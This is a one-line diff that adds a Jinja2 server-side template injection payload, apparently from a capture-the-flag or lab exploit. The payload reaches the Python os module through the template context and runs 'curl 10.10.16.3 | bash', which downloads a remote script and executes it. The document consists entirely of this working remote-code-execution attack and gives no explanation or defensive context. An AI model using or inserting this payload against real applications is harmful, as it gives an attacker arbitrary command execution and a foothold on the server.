@@ -1,0 +1,1 @@
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl 10.10.16.3 | bash').read() }}
